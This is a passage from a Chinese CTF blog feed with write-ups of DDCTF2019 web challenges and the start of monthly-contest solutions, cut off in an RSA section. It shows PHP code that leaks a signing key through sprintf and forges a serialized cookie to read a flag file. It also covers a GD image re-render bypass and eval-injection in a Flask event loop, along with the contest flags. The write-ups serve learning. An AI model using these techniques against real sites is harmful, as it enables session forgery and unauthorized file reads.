class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></div></figure><p>查看session.php代码可知，主要逻辑在session_read和session_create两个功能，session_create建立cookie并签名，session_read验证签名然后反序列化，而在Session类继承的__destruct方法中存在文件读取，所以本题的思路就是利用反序列化来读取flag。<br>为了破解签名，我们需要知道eancrykey，题目中存在如下代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>该段代码将eancrykey也放进了数组中，所以我们可以利用nickname中的%s将其输出，例如：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$key = <span class="string">'aesm1p'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'snow %s'</span>,$key);</span><br><span class="line">$data = <span class="string">"welcome %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">$data = sprintf($data,$v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></div></figure></p><p>可以得到结果</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome snow aesm1p</span><br></pre></td></tr></table></div></figure><p>提交的时候必须要加上didictf_username头</p><p><img src="/2020/09/13/DDCTF2019/1.png" alt></p><p>成功读取到秘钥值为<code>EzblrbNS</code>，接下里就是反序列化，代码如下：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$a = <span class="keyword">new</span> Session();</span><br><span class="line">$a-&gt;path = <span class="string">'..././config/flag.txt'</span>;</span><br><span class="line"></span><br><span class="line">$cookiedata = serialize($a);</span><br><span class="line">$cookiedata = $cookiedata.md5($key.$cookiedata);</span><br><span class="line"><span class="keyword">echo</span> $cookiedata.<span class="string">'  '</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($cookiedata);</span><br></pre></td></tr></table></div></figure><p>修改cookie即可得到flag</p><p><img src="/2020/09/13/DDCTF2019/2.png" alt></p><p>flag: <code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p>        <h1 id="Upload-IMG">          <a href="#Upload-IMG" class="heading-link"><i class="fas fa-link"></i></a>Upload-IMG</h1>      <p>我们上传之后的图片会被二次渲染，查看返回的图片可以看到<code>gd-jpeg v1.0</code>，是php的gd库渲染的，本题的考点是gd二次渲染绕过，要求我们将payload<br>[phpinfo();]写入图片中，可以用工具跑一下（修改写入的payload），然后就会生成符合条件的图片</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php imga_name</span><br></pre></td></tr></table></div></figure><p>PS：可能需要多次才能成功，试一些比较大的图片成功率高，还有就是在linux下做，不要在windows下进行尝试</p><p>然后提交图片即可</p><p>flag：<code>DDCTF{B3s7_7ry_php1nf0_57d79f001ace9fad}</code></p>        <h1 id="homebrew-event-loop">          <a href="#homebrew-event-loop" class="heading-link"><i class="fas fa-link"></i></a>homebrew event loop</h1>      <p>源代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66147e657'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">    </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></div></figure><p>这是一个flask系统，但是却与普通的flask系统不同，正常flask系统是通过<code>app.route</code>来编写路由的，而本题中却是维护了一个事件队列来进行路由，按照先进先出的规则处理事件，通过分割我们输入的查询字符串来处理事件，通读代码我们可以发现存在一个敏感函数eval()</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></div></figure><p>其实此处可以不使用eval函数的，而且由于action参数可控，导致我们可以注入恶意函数进去（用#注释掉action后面的内容），比如</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action,is_action = <span class="string">'int#'</span>,<span class="literal">False</span></span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line"><span class="comment"># ret_val = event_handler(args)</span></span><br><span class="line"><span class="keyword">print</span> event_handler(<span class="number">1.1</span>)</span><br></pre></td></tr></table></div></figure><p>此时可以成功执行int函数</p><p>想要得到flag的话需要调用<code>get_flag_hander()</code>函数，查看代码可知需要<code>session[&#39;num_items&#39;] &gt;= 5</code>即可将flag写入session，此处需要我们购买5个钻石</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br></pre></td></tr></table></div></figure><p>查看此处代码发现存在明显的逻辑问题，即购买时系统先完成购买<code>session[&#39;num_items&#39;] += num_items</code>，然后才触发事件检验金额是否足够<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，如果不够的话进行回滚，这样的话在该回滚事件执行之前我们可以短暂的成功购买，此时执行get_flag函数即可成功执行，我们可以构建一个这样的事件队列</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buy-&gt;get_flag-&gt;consume_point</span><br></pre></td></tr></table></div></figure><p>结合上面的eval函数漏洞，我们可以实现该攻击，trigger_event函数可以将事件插入队列，我们可以利用该函数将buy和get_flag函数插入队列</p><p><img src="/2020/09/13/DDCTF2019/3.png" alt></p><p>解密session即可得到flag</p><p>flag: <code>DDCTF{3v41_3v3nt_1O0p_aNd_fLASK_cOOk1e}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒月赛复现集合</title>
    <link href="http://chaosec.top/2020/09/13/month-race/"/>
    <id>http://chaosec.top/2020/09/13/month-race/</id>
    <published>2020-09-13T12:26:04.000Z</published>
    <updated>2020-09-13T12:26:04.053Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p><p>部分安恒月赛题目的复现记录</p><a id="more"></a>        <h1 id="5月月赛">          <a href="#5月月赛" class="heading-link"><i class="fas fa-link"></i></a>5月月赛</h1>              <h2 id="crypto-amp-misc">          <a href="#crypto-amp-misc" class="heading-link"><i class="fas fa-link"></i></a>crypto&amp;misc</h2>      <p>地址:<span class="exturl"><a class="exturl__link" href="https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg" target="_blank" rel="noopener">https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   提取码：259q</p>        <h3 id="baby-writeup">          <a href="#baby-writeup" class="heading-link"><i class="fas fa-link"></i></a>baby_writeup</h3>      <p>拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, 17, stdin);</span><br><span class="line">if ( strlen(s) !&#x3D; 16 )</span><br><span class="line">exit(0);</span><br><span class="line">sub_400756(s, &amp;v6);</span><br><span class="line">for ( i &#x3D; 0; i &lt; strlen(v6); ++i )</span><br><span class="line">&#123;</span><br><span class="line">if ( byte_601100[(signed __int64)i] !&#x3D; v6[i] )</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Flag&#123;%s&#125;\n&quot;, s);</span><br></pre></td></tr></table></div></figure><p>可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6DAB1EEB88B9B6179B7ACB7E</span><br></pre></td></tr></table></div></figure><p>猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;5aff787616ad1 </span><br><span class="line">base64i5thebest+</span><br><span class="line">Flag&#123;base64i5thebest+&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="RSA">          <a href="#RSA" class="heading-link"><i class="fas fa-link"></i></a>RSA</h3>      <p>这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span 